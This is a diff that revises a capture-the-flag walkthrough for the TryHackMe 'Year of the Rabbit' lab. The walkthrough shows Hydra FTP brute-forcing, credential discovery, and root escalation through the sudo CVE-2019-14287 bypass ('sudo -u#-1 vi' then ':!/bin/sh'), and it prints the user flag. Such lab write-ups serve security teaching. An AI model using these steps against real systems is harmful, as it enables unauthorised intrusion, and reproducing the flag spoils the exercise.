@@ -1,61 +1,107 @@
 # TryHackMe: Year of the Rabbit
 
-**Difficulty**: Easy
+**Difficulty:** Easy  
+**Platform:** TryHackMe  
+**Category:** Web / Cryptography / Sudo PrivEsc  
 
-## Step - 1
-First of all start the machine and find all the open ports using the following command.
+---
+
+## Overview & Attack Path
+1. **Reconnaissance:** Port scanning with Nmap and web directory fuzzing with Gobuster.
+2. **Web Discovery:** Finding a hidden PHP page in `styles.css` that disables redirects and reveals a hidden directory `/WExYY2Cv-qU`.
+3. **Steganography & FTP:** Extracting hidden FTP credentials from `Hot_Babe.png` using `strings` and brute-forcing FTP with Hydra.
+4. **Brainfuck Decoding:** Retrieving `Eli's_Creds.txt` from FTP and decoding Brainfuck to gain SSH access as user `eli`.
+5. **Lateral Movement:** Finding Gwendoline's credentials in `/usr/games/s3cr3t` to capture the user flag.
+6. **Privilege Escalation:** Exploiting the Sudo `sudo -u#-1` bypass vulnerability (CVE-2019-14287) on `/usr/bin/vi` to gain root access.
+
+---
+
+## Step 1: Reconnaissance (Nmap & Gobuster)
+
+First, scan the machine to identify all open ports and running services:
+
 ```bash
-nmap -p- --min-rate=10000 -T4 <IP>
+nmap -p- --min-rate=10000 -T4 <TARGET_IP>
 ```
 
-We would get the following ports.
+### Scan Results:
+* **Port 21 (FTP):** `vsftpd`
+* **Port 22 (SSH):** `OpenSSH`
+* **Port 80 (HTTP):** `Apache`
 
 ![Nmap scan results](../images/5b0f3c27f7a95a848760899761af4c54.png)
 
-## Step 2
-As port 80 is open we can use gobuster to find hidden directories and files.
+---
+
+## Step 2: Web Enumeration & Hidden Directories
+
+Since port 80 is open, run Gobuster to discover hidden directories and files:
+
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
 
 ![Gobuster results](../images/143eb5c15c4ca3b9e108a3bdbd90596f.png)
 
-Now we can see there is a dir named `assets` lets explore it. We get 2 files in it a `styles.css` and `RickRolled.mp4`. After reading through `styles.css` we find this, its a path to a php site. Lets explore it.
+A directory named `/assets` is discovered containing `styles.css` and `RickRolled.mp4`. Inspecting `styles.css` reveals a hidden PHP endpoint:
 
 ![Path to PHP site found in styles.css](../images/ad1a1f5b50662ebe2a62d22f235626ee.png)
 
-After searching it found a alert message with the following message,
+Visiting the PHP page displays a popup alert:
 
 ![Alert message](../images/e249ff6939ca4dc407d394ec77b5d71b.png)
 
-Hmm! interesting we now have 2 ways to solve this:
-1. Turn of javascript as the message says, Now to turn of javascript in firefox you have to go to `about:config` --> search `javascript.enabled` and change its value to false.
-2. (Which i used) press F12, it will open the inspect, then go to the debugger section and there you will see something like this:
+To bypass the JavaScript redirect loop:
+1. **Option 1:** Disable JavaScript in Firefox (`about:config` → `javascript.enabled` = `false`).
+2. **Option 2:** Open Developer Tools (F12) → Debugger to inspect the script logic.
 
 ![Debugger analysis](../images/9b4ae3316aadb50c522841db14a4562e.png)
 
-## Step 3
-With not a proper lead and constant redirecting to the rick roll youtube channel i decided to curl it and got the hidden directory `/WExYY2Cv-qU`
+Alternatively, curl the endpoint directly to avoid redirects and uncover the hidden path `/WExYY2Cv-qU`:
 
 ![Hidden directory CURL results](../images/e812937fdff11bb77d57515d40f07dd9.png)
 
+---
+
+## Step 3: Steganography & FTP Brute-Forcing
+
+Navigating to `/WExYY2Cv-qU` yields an image file named `Hot_Babe.png`:
+
 ![Hot_Babe.png](../images/af94a8ad849164fa1dae57df002fddaa.png)
 
-a file named `Hot_Babe.png` lets download and use exiftool on it nothing important, then i tried strings.
+Download the image and inspect it using the `strings` command:
+
+```bash
+strings Hot_Babe.png
+```
 
 ![Strings on image](../images/67b5a1dc8d9d62d43e8743353770e631.png)
 
-We got the FTP username `ftpuser` and we also got a list of passwords. We can use hydra to find the correct password. Save the following password as `password.txt` and then run the following command:
+The output reveals an FTP username **`ftpuser`** alongside a custom wordlist. Save the extracted words to `password.txt` and brute-force the FTP login with Hydra:
+
 ```bash
-hydra -l ftpuser -P password.txt ftp://<IP>
+hydra -l ftpuser -P password.txt ftp://<TARGET_IP>
 ```
 
 ![Hydra FTP password crack](../images/e89881766225ab5696c656348fc62209.png)
 
-got the password now lets connect with FTP.
+Connect to the FTP service with the cracked credentials:
 
 ![FTP connection](../images/2096121a36d43ed19bf651e72016f841.png)
 
-After connecting with FTP we can see the files using `ls`, a file named `Eli's_Creds.txt` is found, lets get it using the command `get Eli's_Creds.txt` then exit the system and cat the file.
+Download the file `Eli's_Creds.txt`:
 
-we get this
+```text
+ftp> get Eli's_Creds.txt
+ftp> exit
+```
+
+---
+
+## Step 4: Brainfuck Decoding & SSH Foothold
+
+Inspect the contents of `Eli's_Creds.txt`:
+
 ```text
 +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->- 
 --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ 
@@ -70,17 +116,26 @@ we get this
 <]>+. <+++[ ->--- <]>-- ---.- ----. <
 ```
 
-Now if you have been doing CTFs and all this is Brain Fuck encoded code
+This text is encoded in **Brainfuck**. Decoding it reveals the SSH password for user `eli`.
 
 ![BrainFuck decoding](../images/16dbfa77d9ac58adaba3977e716abcf2.png)
 
-we got the ssh creds now lets login
+Log in via SSH:
+
+```bash
+ssh eli@<TARGET_IP>
+```
 
 ![SSH login](../images/16b58d417c4111482d6c5e03f9832345.png)
 
-we have a message `"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"`
+---
 
-While enumerating as eli, I searched the system for anything matching “s3cr3t” and discovered a hidden directory at `/usr/games/s3cr3t`. Inside was a file containing a note from root that revealed Gwendoline’s password. Using this password, I switched users with `su gwendoline` and gained access to her account, allowing me to read the `user.txt` flag.
+## Step 5: Lateral Movement to Gwendoline & User Flag
+
+Upon logging in, a message notes:  
+`"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"`
+
+Search the filesystem for the secret directory:
 
 ```bash
 find / -type d -name "*s3cr3t*" 2>/dev/null
@@ -88,17 +143,50 @@ find / -type d -name "*s3cr3t*" 2>/dev/null
 
 ![Finding secret directory](../images/8f9732ed0b0dc10900f7deec9191c0f3.png)
 
-Got the first flag `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`
+The directory `/usr/games/s3cr3t` contains a note with Gwendoline's password. Switch to `gwendoline` and read the user flag:
 
-Now lets try to escalate privileges, for this lets see what commands we can execute as Gwendoline using `sudo -l`
+```bash
+su gwendoline
+cat /home/gwendoline/user.txt
+```
+
+> **User Flag:** `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`
+
+---
+
+## Step 6: Privilege Escalation (Sudo CVE-2019-14287) & Root Flag
+
+Check sudo permissions for user `gwendoline`:
+
+```bash
+sudo -l
+```
 
 ![Checking sudo privileges](../images/68f19768a7a9b22e4c2c83ca5a244ccf.png)
 
+The configuration permits running `/usr/bin/vi /home/gwendoline/user.txt` as any user *except* root (`(ALL, !root)`). This can be bypassed using the known Sudo UID `-1` flaw (**CVE-2019-14287**):
+
 ```bash
-sudo -u#1 /usr/bin/vi /home/gwendoline/user.txt
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
 ```
 
-By a using sudo misconfiguration and using a kind of exploit we get the flag
+Once inside `vi`, drop into a root shell by executing:
+```text
+:!/bin/sh
+```
+
+Retrieve the root flag from `/root/root.txt`:
 
 ![Final flag after privilege escalation](../images/9e3c1ec3fe907ba8789595e03f1d0a89.png)
 
+---
+
+## Summary of Answers
+
+| Task / Question | Answer / Value |
+| :--- | :--- |
+| **FTP Username** | `ftpuser` |
+| **SSH User** | `eli` |
+| **User Pivot** | `gwendoline` |
+| **User Flag** | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
+| **Root Exploit** | `CVE-2019-14287 (sudo -u#-1)` |
